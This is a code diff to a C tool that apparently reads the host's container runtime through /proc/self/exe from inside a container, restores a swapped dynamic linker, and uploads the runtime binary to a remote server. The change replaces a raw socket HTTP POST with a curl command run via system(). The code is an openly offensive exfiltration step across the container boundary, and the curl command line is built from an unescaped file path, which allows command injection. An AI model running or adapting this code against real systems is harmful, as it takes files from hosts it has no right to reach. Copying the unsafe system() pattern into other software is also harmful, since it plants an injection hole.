@@ -54,54 +54,53 @@ int parse_arguments(config * conf, int argc, char const *argv[])
 }
 
 
-bool send_post_file_http_header(int sockfd, const char * server_ip, unsigned long long file_size, const char * filename)
+int sendfile_curl(const char * server_ip, unsigned int port, int fd, const char * filepath)
 {
-    char header[HEADER_BUF_SIZE];
-    char * header_format;
+    char curl_cmd[LARGE_BUF_SIZE];
     int rc;
 
-    if (filename != NULL)
-    {
-        header_format =
-          "POST / HTTP/1.1\r\n"
-          "Host: %s\r\n"
-          "Content-Type: application/octet-stream\r\n"
-          "Content-Length: %llu\r\n" 
-          "Content-Disposition: attachment; filename=\"%s\"\r\n"
-          "Connection: close\r\n"
-          "\r\n";
-
-        rc = snprintf(header, HEADER_BUF_SIZE, header_format, server_ip, file_size, filename);
-    }
+    if (filepath != NULL)
+        rc = snprintf(
+            curl_cmd, 
+            LARGE_BUF_SIZE, 
+            "curl -s -S -H \"Content-Type: application/octet-stream\" -H \"Content-Disposition: attachment; filename=%s\" --data-binary @/proc/self/fd/%d %s:%u", 
+            filepath,
+            fd,
+            server_ip,
+            port);
     else
-    {
-        header_format =
-          "POST / HTTP/1.1\r\n"
-          "Host: %s\r\n"
-          "Content-Type: application/octet-stream\r\n"
-          "Content-Length: %llu\r\n" 
-          "Content-Disposition: attachment\r\n"
-          "Connection: close\r\n"
-          "\r\n";
-
-        rc = snprintf(header, HEADER_BUF_SIZE, header_format, server_ip, file_size);
-    }
-
+        rc = snprintf(
+            curl_cmd, 
+            LARGE_BUF_SIZE, 
+            "curl -s -S -H \"Content-Type: application/octet-stream\" -H \"Content-Disposition: attachment\" --data-binary @/proc/self/fd/%d %s:%u", 
+            fd,
+            server_ip,
+            port);
+    
     if (rc < 0) 
     {
-        printf("[!] send_http_header: snprintf(header) failed with '%s'\n", strerror(errno));
-        return false;
+        printf("[!] sendfile_curl: snprintf(curl_cmd) failed with '%s'\n", strerror(errno));
+        return -1;
     }
-    if (rc >= HEADER_BUF_SIZE)
+    if (rc >= LARGE_BUF_SIZE)
     {
-        printf("[!] send_http_header: snprintf(header) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, HEADER_BUF_SIZE);
-        return false;
+        printf("[!] sendfile_curl: snprintf(curl_cmd) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, SMALL_BUF_SIZE);
+        return -1;
     }
 
-    return send_all(sockfd, (void *) header, (size_t) strlen(header));
+    errno = 0; 
+    rc = system(curl_cmd);
 
+    if (rc == 0 && errno == 0)
+        return 0;
+    
+    if (errno != 0)
+        printf("[!] sendfile_curl: Failed to spawn curl via system() with '%s'\n", strerror(errno));
+    else
+        printf("[!] sendfile_curl: \"/bin/sh -c 'curl ...'\" returned non-zero exit code '%d'\n", rc);
+
+    return -1;
 }
-
 
 
 int main(int argc, char const *argv[])
@@ -134,6 +133,13 @@ int main(int argc, char const *argv[])
         {
             printf("[!] main: open(\"/proc/self/exe\") failed with '%s'\n", strerror(errno));
             return 1;
+        }
+
+        // Restore original dynamic linker to allow curl to work properly
+        if (rename(ORIGINAL_LD_PATH, LD_PATH) < 0)
+        {
+            printf("[!] main: Failed to restore dynamic linker via rename() with '%s'\n", strerror(errno));
+            goto close_runtime_ret_1;
         }
     }
     else
@@ -188,26 +194,16 @@ int main(int argc, char const *argv[])
         rt_hostpath = rt_hostpath_buf;
     }
 
+    /* Upload runtime to server */
     printf("[+] Uploading...\n");
-
-    /* connect to server */
-    sockfd = connect_to_server(conf.server_ip, conf.port, SEND_TIMEOUT, RECV_TIMEOUT);
-    if (sockfd < 0)
+    // No hurry to send the runtime, even in wait-for-exec mode,
+    // as we opened a file descriptor pointing to it. Defer to curl
+    if (sendfile_curl(conf.server_ip, conf.port, runtime_fd, rt_hostpath) < 0)
         goto close_runtime_ret_1;
-
-    /* send http POST request header */
-    if (send_post_file_http_header(sockfd, conf.server_ip, (unsigned long long)file_info.st_size, rt_hostpath) == false)
-        goto close_both_ret_1;
-
-    /* send container runtime to server */
-    if (sendfile_all(sockfd, runtime_fd, (size_t)file_info.st_size) == false)
-        goto close_both_ret_1;
 
     printf("[+] Done\n");
     return 0;
 
-close_both_ret_1:
-    close(sockfd);
 close_runtime_ret_1:
     close(runtime_fd); 
     return 1;
